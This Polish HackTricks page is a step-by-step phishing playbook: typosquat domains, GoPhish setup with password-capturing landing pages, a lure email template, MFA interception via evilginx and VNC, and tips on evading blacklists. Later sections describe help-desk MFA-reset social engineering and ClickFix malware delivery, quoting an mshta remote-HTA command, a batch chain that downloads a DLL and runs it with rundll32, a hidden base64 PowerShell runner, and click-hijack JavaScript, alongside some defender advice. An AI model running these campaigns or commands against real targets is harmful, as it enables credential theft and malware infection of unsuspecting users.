# Metodologia phishingu

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Rozpoznaj ofiarę
   1. Wybierz **domenę ofiary**.
   2. Przeprowadź podstawowe rozpoznanie sieci, **wyszukując portale logowania** używane przez ofiarę, i **zdecyduj**, który z nich będziesz **imitować**.
   3. Użyj **OSINT**, aby **znaleźć adresy e-mail**.
2. Przygotuj środowisko
   1. **Kup domenę**, której użyjesz do oceny phishingowej.
   2. **Skonfiguruj rekordy związane z usługą poczty e-mail** (SPF, DMARC, DKIM, rDNS).
   3. Skonfiguruj VPS z **gophish**.
3. Przygotuj kampanię
   1. Przygotuj **szablon wiadomości e-mail**.
   2. Przygotuj **stronę internetową** do kradzieży danych uwierzytelniających.
4. Uruchom kampanię!

## Generowanie podobnych nazw domen lub zakup zaufanej domeny

### Techniki modyfikowania nazw domen

- **Słowo kluczowe**: Nazwa domeny **zawiera** ważne **słowo kluczowe** z oryginalnej domeny (np. zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Subdomena z łącznikiem**: Zastąp **kropkę łącznikiem** w subdomenie (np. www-zelster.com).
- **Nowa TLD**: Ta sama domena z użyciem **nowej TLD** (np. zelster.org).
- **Homoglif**: **Zastępuje** literę w nazwie domeny **podobnie wyglądającą literą** (np. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Przestawienie:** **Zamienia miejscami dwie litery** w nazwie domeny (np. zelsetr.com).
- **Liczba pojedyncza/mnoga**: Dodaje lub usuwa „s” na końcu nazwy domeny (np. zeltsers.com).
- **Pominięcie**: **Usuwa jedną** z liter nazwy domeny (np. zelser.com).
- **Powtórzenie:** **Powtarza jedną** z liter nazwy domeny (np. zeltsser.com).
- **Zastąpienie**: Podobne do homoglifów, ale mniej dyskretne. Zastępuje jedną z liter w nazwie domeny, na przykład literą znajdującą się blisko oryginalnej na klawiaturze (np. zektser.com).
- **Dodanie subdomeny**: Wstawia **kropkę** wewnątrz nazwy domeny (np. ze.lster.com).
- **Wstawienie**: **Wstawia literę** do nazwy domeny (np. zerltser.com).
- **Brak kropki**: Dołącza TLD do nazwy domeny (np. zelstercom.com).

**Narzędzia automatyczne**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Strony internetowe**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Istnieje **możliwość, że niektóre przechowywane lub przesyłane bity zostaną automatycznie odwrócone** z różnych przyczyn, takich jak rozbłyski słoneczne, promieniowanie kosmiczne lub błędy sprzętowe.

Gdy tę koncepcję **zastosuje się do żądań DNS**, może się zdarzyć, że **domena otrzymana przez serwer DNS** będzie inna niż domena pierwotnie zażądana.

Na przykład zmiana pojedynczego bitu w domenie „windows.com” może zmienić ją na „windnws.com”.

Atakujący mogą **wykorzystać to, rejestrując wiele domen powstałych przez bitflipping**, podobnych do domeny ofiary. Ich celem jest przekierowanie legalnych użytkowników do własnej infrastruktury.

Więcej informacji znajdziesz tutaj: [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Kup zaufaną domenę

Na stronie [https://www.expireddomains.net/](https://www.expireddomains.net) możesz wyszukać wygasłą domenę, której można użyć.\
Aby upewnić się, że wygasła domena, którą zamierzasz kupić, **ma już dobrą pozycję SEO**, możesz sprawdzić, jak jest sklasyfikowana w:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Wyszukiwanie adresów e-mail

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% za darmo)
- [https://phonebook.cz/](https://phonebook.cz) (100% za darmo)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Aby **znaleźć więcej** prawidłowych adresów e-mail lub **zweryfikować te**, które udało Ci się już znaleźć, sprawdź, czy możesz przeprowadzić brute force na serwerach SMTP ofiary. [Dowiedz się tutaj, jak weryfikować/wyszukiwać adresy e-mail](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ponadto pamiętaj, że jeśli użytkownicy korzystają z **portalu internetowego, aby uzyskać dostęp do poczty**, możesz sprawdzić, czy jest podatny na **brute force nazw użytkowników**, i wykorzystać tę podatność, jeśli to możliwe.

## Konfiguracja GoPhish

### Instalacja

Możesz pobrać GoPhish ze strony [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Pobierz go, rozpakuj w katalogu `/opt/gophish` i uruchom `/opt/gophish/gophish`\
W danych wyjściowych pojawi się hasło użytkownika admin dla portu 3333. Otwórz ten port i użyj tych danych uwierzytelniających, aby zmienić hasło administratora. Może być konieczne przekierowanie tego portu lokalnie:

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Konfiguracja

**Konfiguracja certyfikatu TLS**

Przed tym krokiem musisz **już kupić domenę**, której zamierzasz użyć, i musi ona **wskazywać** na **adres IP VPS-a**, na którym konfigurujesz **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Konfiguracja poczty**

Rozpocznij instalację: `apt-get install postfix`

Następnie dodaj domenę do następujących plików:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Zmień również wartości następujących zmiennych w pliku /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Na koniec zmień zawartość plików **`/etc/hostname`** i **`/etc/mailname`**, wpisując nazwę swojej domeny, a następnie **uruchom ponownie VPS.**

Teraz utwórz rekord **DNS A** dla `mail.<domain>`, wskazujący na **adres IP** VPS, oraz rekord **DNS MX** wskazujący na `mail.<domain>`.

Teraz przetestujmy wysyłanie wiadomości e-mail:

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Konfiguracja Gophish**

Zatrzymaj działanie gophish i skonfigurujmy go.\
Zmień `/opt/gophish/config.json` na następującą zawartość (zwróć uwagę na użycie https):

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Konfiguracja usługi gophish**

Aby utworzyć usługę gophish, która będzie uruchamiana automatycznie i zarządzana jako usługa, możesz utworzyć plik `/etc/init.d/gophish` o następującej zawartości:

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Dokończ konfigurację usługi i sprawdź ją, wykonując następujące czynności:

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Konfiguracja serwera pocztowego i domeny

### Poczekaj i działaj legalnie

Im starsza domena, tym mniejsze prawdopodobieństwo, że zostanie uznana za spam. Dlatego przed oceną phishingową należy odczekać jak najdłużej (co najmniej 1 tydzień). Ponadto, jeśli umieścisz na stronie treści z sektora cieszącego się dobrą reputacją, reputacja domeny będzie lepsza.

Pamiętaj, że nawet jeśli musisz odczekać tydzień, możesz już teraz zakończyć konfigurację.

### Konfiguracja rekordu Reverse DNS (rDNS)

Ustaw rekord rDNS (PTR), który wskazuje adres IP VPS na nazwę domeny.

### Rekord Sender Policy Framework (SPF)

Musisz **skonfigurować rekord SPF dla nowej domeny**. Jeśli nie wiesz, czym jest rekord SPF, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Możesz skorzystać z [https://www.spfwizard.net/](https://www.spfwizard.net), aby wygenerować politykę SPF (użyj adresu IP VPS).

![Formularz SPF Wizard do generowania rekordu SPF dla domeny phishingowej](<../../images/image (1037).png>)

To jest treść, którą należy ustawić w rekordzie TXT w domenie:

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Rekord Domain-based Message Authentication, Reporting & Conformance (DMARC)

Musisz **skonfigurować rekord DMARC dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DMARC, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Musisz utworzyć nowy rekord DNS TXT wskazujący na nazwę hosta `_dmarc.<domain>` i zawierający następującą treść:

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Musisz **skonfigurować DKIM dla nowej domeny**. Jeśli nie wiesz, czym jest rekord DKIM, [**przeczytaj tę stronę**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ten samouczek bazuje na: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Musisz połączyć obie wartości B64 generowane przez klucz DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Sprawdź ocenę konfiguracji poczty e-mail

Możesz to zrobić za pomocą [https://www.mail-tester.com/](https://www.mail-tester.com)\
Otwórz stronę i wyślij wiadomość e-mail na podany adres:

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Możesz też **sprawdzić konfigurację poczty e-mail**, wysyłając wiadomość na adres `check-auth@verifier.port25.com` i **odczytując odpowiedź** (w tym celu musisz **otworzyć** port **25** i sprawdzić odpowiedź w pliku _/var/mail/root_, jeśli wyślesz wiadomość jako root).\
Sprawdź, czy przechodzisz wszystkie testy:

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Możesz też wysłać **wiadomość na kontrolowane przez siebie konto Gmail** i sprawdzić **nagłówki wiadomości** w skrzynce odbiorczej Gmaila. W polu nagłówka `Authentication-Results` powinno być `dkim=pass`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### Usuwanie z czarnej listy Spamhouse

Strona [www.mail-tester.com](https://www.mail-tester.com) może wskazać, czy Twoja domena jest blokowana przez spamhouse. Możesz poprosić o usunięcie swojej domeny/IP pod adresem: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Usuwanie z czarnej listy Microsoft

​​Możesz poprosić o usunięcie swojej domeny/IP pod adresem [https://sender.office.com/](https://sender.office.com).

## Tworzenie i uruchamianie kampanii GoPhish

### Profil wysyłkowy

- Ustaw **nazwę identyfikującą** profil nadawcy
- Zdecyduj, z którego konta będziesz wysyłać phishingowe wiadomości e-mail. Sugestie: _noreply, support, servicedesk, salesforce..._
- Możesz pozostawić pola nazwy użytkownika i hasła puste, ale pamiętaj, aby zaznaczyć opcję Ignore Certificate Errors

![Tworzenie i uruchamianie kampanii GoPhish - Profil wysyłkowy: Możesz pozostawić pola nazwy użytkownika i hasła puste, ale pamiętaj, aby zaznaczyć opcję Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Zaleca się skorzystanie z funkcji "**Send Test Email**", aby sprawdzić, czy wszystko działa.\
> Zalecam **wysyłanie testowych wiadomości e-mail na adresy 10min mails**, aby uniknąć trafienia na czarną listę podczas testów.

### Szablon wiadomości e-mail

- Ustaw **nazwę identyfikującą** szablon
- Następnie wpisz **temat** (nic dziwnego, po prostu coś, czego można się spodziewać w zwykłej wiadomości e-mail)
- Upewnij się, że zaznaczono opcję "**Add Tracking Image**"
- Napisz **szablon wiadomości e-mail** (możesz użyć zmiennych, tak jak w poniższym przykładzie):

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Pamiętaj, że **aby zwiększyć wiarygodność wiadomości e-mail**, zaleca się użycie podpisu z wiadomości od klienta. Oto kilka sugestii:

- Wyślij wiadomość e-mail na **nieistniejący adres** i sprawdź, czy odpowiedź zawiera podpis.
- Wyszukaj **publiczne adresy e-mail**, takie jak info@ex.com, press@ex.com lub public@ex.com, wyślij na nie wiadomość i poczekaj na odpowiedź.
- Spróbuj skontaktować się z **odkrytym, prawidłowym adresem e-mail** i poczekaj na odpowiedź.

![Sending Profile - Email Template: Spróbuj skontaktować się z odkrytym, prawidłowym adresem e-mail i poczekaj na odpowiedź](<../../images/image (80).png>)

> [!TIP]
> Email Template umożliwia również **załączanie plików do wysłania**. Jeśli chcesz też przechwytywać wyzwania NTLM za pomocą specjalnie spreparowanych plików/dokumentów, [przeczytaj tę stronę](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Strona docelowa

- Wpisz **nazwę**
- **Wpisz kod HTML** strony internetowej. Pamiętaj, że możesz **zaimportować** strony internetowe.
- Zaznacz **Capture Submitted Data** i **Capture Passwords**
- Ustaw **przekierowanie**

![Email Template - Landing Page: Zaznacz Capture Submitted Data i Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Zwykle trzeba będzie zmodyfikować kod HTML strony i przetestować ją lokalnie (na przykład przy użyciu serwera Apache), **aż uzyskasz oczekiwany rezultat.** Następnie wklej ten kod HTML w polu.\
> Jeśli potrzebujesz **użyć zasobów statycznych** dla strony HTML (na przykład plików CSS i JS), możesz zapisać je w _**/opt/gophish/static/endpoint**_, a następnie uzyskać do nich dostęp pod adresem _**/static/\<filename>**_

> [!TIP]
> Jako przekierowanie możesz ustawić **przekierowanie użytkowników na główną, prawdziwą stronę internetową ofiary** albo na przykład przekierować ich do _/static/migration.html_, wyświetlić **obracające się kółko (**[**https://loading.io/**](https://loading.io)**) przez 5 sekund, a następnie poinformować, że proces zakończył się pomyślnie**.

### Użytkownicy i grupy

- Ustaw nazwę
- **Zaimportuj dane** (pamiętaj, że aby użyć szablonu z przykładu, potrzebujesz imienia, nazwiska i adresu e-mail każdego użytkownika)

![Landing Page - Users & Groups: Zaimportuj dane (pamiętaj, że aby użyć szablonu z przykładu, potrzebujesz imienia, nazwiska i adresu e-mail każdego użytkownika)](<../../images/image (163).png>)

### Kampania

Na koniec utwórz kampanię, wybierając nazwę, szablon wiadomości e-mail, stronę docelową, URL, profil wysyłkowy i grupę. Pamiętaj, że URL będzie linkiem wysłanym do ofiar.

Pamiętaj, że **Sending Profile umożliwia wysłanie testowej wiadomości e-mail, aby sprawdzić, jak będzie wyglądać końcowa wiadomość phishingowa**:

![Users & Groups - Campaign: Pamiętaj, że Sending Profile umożliwia wysłanie testowej wiadomości e-mail, aby sprawdzić, jak będzie wyglądać końcowa wiadomość phishingowa](<../../images/image (192).png>)

Gdy wszystko będzie gotowe, uruchom kampanię!

## Klonowanie stron internetowych

Jeśli z jakiegoś powodu chcesz sklonować stronę internetową, sprawdź tę stronę:


{{#ref}}
clone-a-website.md
{{#endref}}

## Dokumenty i pliki z backdoorem

W ramach niektórych testów phishingowych (głównie dla Red Teams) możesz również chcieć **wysłać pliki zawierające jakiś rodzaj backdoora** (na przykład C2 albo coś, co wywoła uwierzytelnianie).\
Przykłady znajdziesz na tej stronie:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Przez proxy MitM

Poprzedni atak jest dość sprytny, ponieważ podszywasz się pod prawdziwą stronę internetową i zbierasz informacje wprowadzone przez użytkownika. Niestety, jeśli użytkownik nie podał prawidłowego hasła albo aplikacja, pod którą się podszywasz, jest skonfigurowana z 2FA, **te informacje nie pozwolą ci podszyć się pod oszukanego użytkownika**.

Przydatne są tu narzędzia takie jak [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) i [**muraena**](https://github.com/muraenateam/muraena). To narzędzie umożliwia przeprowadzenie ataku typu MitM. W skrócie, atak przebiega następująco:

1. **Podszywasz się pod formularz logowania** prawdziwej strony internetowej.
2. Użytkownik **wysyła** swoje **dane uwierzytelniające** na twoją fałszywą stronę, a narzędzie przesyła je do prawdziwej strony internetowej, **sprawdzając, czy są poprawne**.
3. Jeśli konto jest skonfigurowane z **2FA**, strona MitM poprosi o podanie kodu. Gdy **użytkownik go wprowadzi**, narzędzie prześle go do prawdziwej strony internetowej.
4. Po uwierzytelnieniu użytkownika (jako atakujący) **przechwycisz dane uwierzytelniające, 2FA, cookie i wszystkie informacje** zebrane podczas interakcji, gdy narzędzie przeprowadza atak MitM.

### Przez VNC

A co, jeśli zamiast **przekierować ofiarę na złośliwą stronę** wyglądającą tak samo jak oryginalna, przekierujesz ją do **sesji VNC z przeglądarką połączoną z prawdziwą stroną internetową**? Będziesz móc obserwować jej działania oraz przechwycić hasło, użyte MFA, cookies...\
Możesz to zrobić za pomocą [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Wykrywanie wykrycia

Jednym z najlepszych sposobów sprawdzenia, czy wpadłeś, jest oczywiście **wyszukanie swojej domeny na czarnych listach**. Jeśli się na nich znajduje, oznacza to, że twoja domena została uznana za podejrzaną.\
Prostym sposobem sprawdzenia, czy twoja domena znajduje się na którejś z czarnych list, jest użycie [https://malwareworld.com/](https://malwareworld.com)

Istnieją jednak inne sposoby, aby sprawdzić, czy ofiara **aktywnie wyszukuje podejrzane działania phishingowe w sieci**, jak opisano na stronie:


{{#ref}}
detecting-phising.md
{{#endref}}

Możesz **kupić domenę o nazwie bardzo podobnej do domeny ofiary** i/lub **wygenerować certyfikat** dla **subdomeny** domeny, którą kontrolujesz, **zawierającej** **słowo kluczowe** z domeny ofiary. Jeśli **ofiara** wykona z nimi jakąkolwiek **interakcję DNS lub HTTP**, będziesz wiedzieć, że **aktywnie szuka** podejrzanych domen, więc musisz działać bardzo dyskretnie.<sup>[[2]](#references)</sup>

### Ocena phishingu

Użyj [**Phishious** ](https://github.com/Rices/Phishious), aby ocenić, czy twoja wiadomość e-mail trafi do folderu spamu, zostanie zablokowana, czy też dotrze do odbiorcy.

## Przejęcie tożsamości wymagające bezpośredniego kontaktu (reset MFA przez help desk)

Współczesne grupy intruzów coraz częściej całkowicie pomijają przynęty wysyłane e-mailem i **bezpośrednio atakują proces obsługi zgłoszeń / odzyskiwania tożsamości**, aby obejść MFA. Atak w całości wykorzystuje dostępne narzędzia systemowe: gdy operator zdobędzie prawidłowe dane uwierzytelniające, przechodzi do kolejnych działań przy użyciu wbudowanych narzędzi administracyjnych — nie jest wymagane żadne malware.<sup>[[6]](#references)</sup>

### Przebieg ataku
1. Rozpoznanie ofiary
   * Zbieranie danych osobowych i służbowych z LinkedIn, wycieków danych, publicznych repozytoriów GitHub itp.
   * Identyfikacja tożsamości o wysokiej wartości (kadra kierownicza, IT, finanse) oraz ustalenie **dokładnej procedury help desk** resetowania hasła / MFA.
2. Socjotechnika w czasie rzeczywistym
   * Telefon, kontakt przez Teams lub czat z help desk, podszywając się pod cel (często przy użyciu **sfałszowanego identyfikatora dzwoniącego** lub **sklonowanego głosu**).
   * Podanie wcześniej zebranych danych osobowych, aby przejść weryfikację opartą na wiedzy.
   * Przekonanie pracownika do **zresetowania sekretu MFA** lub wykonania **SIM-swapu** na zarejestrowanym numerze telefonu.
3. Natychmiastowe działania po uzyskaniu dostępu (≤60 min w rzeczywistych przypadkach)
   * Uzyskanie przyczółka przez dowolny portal web SSO.
   * Enumeracja AD / AzureAD za pomocą wbudowanych narzędzi (bez umieszczania plików binarnych):
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Lateral movement za pomocą **WMI**, **PsExec** lub legalnych agentów **RMM**, które są już na allowliście w środowisku.

### Wykrywanie i ograniczanie ryzyka
* Traktuj odzyskiwanie tożsamości przez help desk jako **operację uprzywilejowaną** – wymagaj dodatkowego uwierzytelnienia i zgody menedżera.
* Wdróż reguły **Identity Threat Detection & Response (ITDR)** / **UEBA**, które generują alerty w przypadku:  
  * zmiany metody MFA oraz uwierzytelnienia z nowego urządzenia / lokalizacji geograficznej;
  * natychmiastowego podniesienia uprawnień tego samego principal (user-→-admin).
* Nagrywaj rozmowy z help deskiem i wymagaj **oddzwonienia na wcześniej zarejestrowany numer** przed zresetowaniem danych.
* Wdróż **Just-In-Time (JIT) / Privileged Access**, aby konta po resecie **nie dziedziczyły automatycznie tokenów o wysokich uprawnieniach**.

---

## Oszustwa na dużą skalę – SEO Poisoning i kampanie „ClickFix”
Grupy cyberprzestępcze rekompensują sobie koszty operacji wymagających bezpośredniego kontaktu za pomocą masowych ataków, które wykorzystują **wyszukiwarki i sieci reklamowe jako kanał dostarczania**.<sup>[[6]](#references)</sup>

1. **SEO poisoning / malvertising** umieszcza fałszywy wynik, taki jak `chromium-update[.]site`, na szczycie reklam w wyszukiwarce.
2. Ofiara pobiera niewielki **loader pierwszego etapu** (często JS/HTA/ISO). Przykłady zaobserwowane przez Unit 42:
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Loader eksfiltruje cookies przeglądarki i bazy danych poświadczeń, a następnie pobiera **silent loader**, który w czasie rzeczywistym decyduje, czy wdrożyć:
   * RAT (np. AsyncRAT, RustDesk)
   * ransomware / wiper
   * komponent persistence (klucz Run w rejestrze + zaplanowane zadanie)

### Wskazówki dotyczące wzmacniania zabezpieczeń
* Blokuj nowo zarejestrowane domeny i stosuj **Advanced DNS / URL Filtering** zarówno dla *reklam w wynikach wyszukiwania*, jak i poczty e-mail.
* Ogranicz instalowanie oprogramowania do podpisanych pakietów MSI / Store, a wykonywanie `HTA`, `ISO`, `VBS` blokuj za pomocą zasad.
* Monitoruj procesy potomne przeglądarek, które uruchamiają instalatory:
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Szukaj LOLBins często nadużywanych przez loadery pierwszego etapu (np. `regsvr32`, `curl`, `mshta`).

### Przejęcie kliknięcia przycisku pobierania z przekierowaniem do TDS
Niektóre fałszywe portale z oprogramowaniem pozostawiają widoczny adres pobierania `href` wskazujący na **prawdziwy** URL GitHub/release, ale przejmują **pierwszą** interakcję użytkownika za pomocą JavaScriptu i kierują ofiarę do łańcucha **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Kluczowe cechy:
- Hook zwykle działa w **capture phase** (`true`) na `document`, więc uruchamia się przed handlerami witryny.
- Chrome często używa `mousedown` zamiast `click`, aby powiązać przekierowanie z prawidłowym **user gesture** i zwiększyć skuteczność omijania blokad wyskakujących okien.
- Niektóre warianty najpierw otwierają `about:blank` lub symulują kliknięcia `<a target="_blank">`, a dopiero później przypisują URL TDS.
- Limity po stronie przeglądarki często są przechowywane w `localStorage`, więc **pierwsze kliknięcie** może prowadzić do malware, a odświeżenia lub ponowne próby — do widocznego, wyglądającego na nieszkodliwy linku.
- TDS może stosować filtrowanie według referrera, domeny wejściowej, GEO, fingerprintu przeglądarki/urządzenia, kontroli VPN/datacenter, kontekstu kliknięcia i liczników sesji, przez co powtórzenia analityków nie są deterministyczne.

Pomysły dla obrońców:
- Porównuj wyświetlany `href` z rzeczywistym celem nawigacji generowanym w chwili kliknięcia.
- Wyszukuj handlery `document.addEventListener(..., true)`, które wywołują zarówno `preventDefault()`, jak i `stopImmediatePropagation()` w połączeniu z `window.open`, `about:blank` lub symulowanymi kliknięciami kotwicy.
- Traktuj grupy nowo zarejestrowanych domen do pobierania oprogramowania, które wszystkie ładują ten sam etap CloudFront/JS, jako wyraźny wzorzec zatruwania SEO/TDS.

### ClickFix z fałszywych stron weryfikacyjnych + pobrania LOLBAS wyglądające jak archiwa
Niektóre gałęzie TDS prowadzą do fałszywej strony weryfikacyjnej (w stylu Cloudflare/IUAM), która instruuje ofiarę, by uruchomiła zaufany plik binarny systemu Windows, taki jak:<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notes:
- `mshta.exe` wykonuje **HTA/VBScript na początku odpowiedzi**, nawet jeśli URL udaje archiwum `.7z`; dołączone dane archiwum mogą być wyłącznie przynętą.
- Kolejne etapy często nadal wprowadzają w błąd co do typu pliku (`.rtf` dla PowerShell, `.asar` dla Pythona, ZIP-y z binariami z dodanym paddingiem), a następnie przechodzą do **ręcznego mapowania PE / wykonywania w pamięci**.
- Jeśli reagujesz na jeden z takich łańcuchów, zachowaj **dane z sieci i pamięci od pierwszego udanego uruchomienia**: późniejsze powtórki mogą pokazywać jedynie nieszkodliwą ścieżkę instalatora/SFX albo kończyć się niepowodzeniem, ponieważ udostępnienie payloadu/klucza było powiązane z pierwotną sesją TDS.

### Taktyki dostarczania DLL metodą ClickFix (fałszywa aktualizacja CERT)
* Przynęta: sklonowane ostrzeżenie krajowego CERT z przyciskiem **Update**, który wyświetla instrukcje „naprawy” krok po kroku. Ofiary są instruowane, by uruchomić plik batch, który pobiera DLL i wykonuje ją za pomocą `rundll32`.<sup>[[12]](#references)</sup>
* Zaobserwowany typowy łańcuch batch:
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` zapisuje payload w `%TEMP%`, krótkie uśpienie ukrywa jitter sieciowy, a następnie `rundll32` wywołuje eksportowany entrypoint (`notepad`).
* DLL wysyła beacon z tożsamością hosta i co kilka minut odpytuje C2. Zdalne taski są dostarczane jako **zakodowany w base64 PowerShell**, uruchamiany w ukryciu i z pominięciem zasad.
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
